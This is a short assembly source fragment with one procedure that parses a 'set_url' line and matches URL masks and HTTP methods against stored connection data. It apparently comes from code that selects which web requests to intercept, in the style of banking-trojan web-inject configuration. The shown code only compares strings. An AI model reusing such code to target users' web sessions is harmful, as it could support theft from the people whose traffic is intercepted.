
.code

;; ==================================================================================================== ;;
;; Compare -                                                                                            ;;
;; __in lpBrief  - stored connection data & its len (in 1-st dword)                                     ;;
;; __in lpUrlOpt - pointer to url and options                                                           ;;
;; __in dwLen    - len of url and options                                                               ;;
;; Return:  0 - failed                                                                                  ;;
;;         !0 - success                                                                                 ;;
;;              eax - pointer to options                                                                ;;
;;              ecx - len of options                                                                    ;;
;; ==================================================================================================== ;;
Compare proc uses edx edi esi lpBrief, lpUrlOpt, dwLen : dword

	;; url & options
	invokx  &StrIPos[ebx], lpUrlOpt, dwLen, "\r\n", 2
	jmpz eax, @ret
	mov  ecx, eax		;; end of set_url string


	sub  eax, lpUrlOpt	;; len of  url & opt
	invokx  &StrIPos[ebx], lpUrlOpt, eax, " ", 1
	jmpz eax, @ret
	mov  edi, eax		;; options ptr


	;; brief
	mov  esi, lpBrief
	lodsd				;; data len
	invokx  &StrIPos[ebx], esi, eax, "\r\n", 2
	jmpz eax, @ret
	mov  edx, eax		;; end of string


	sub  eax, esi		;; size of string
	invokx  &StrIPos[ebx], esi, eax, " ", 1
	jmpz eax, @ret


	inc  eax			;; url ptr
	sub  edx, eax		;; url len


	;; Compare URL
	mov  dwLen, edi
	sub  edi, lpUrlOpt
	invokx  &StrIMaskMatch[ebx], eax, edx, lpUrlOpt, edi
	jmpz eax, @ret


	;; Compare method
	sub  ecx, dwLen
	invokx  &StrIPos[ebx], dwLen, ecx, esi, 1


@ret:
	ret
Compare endp

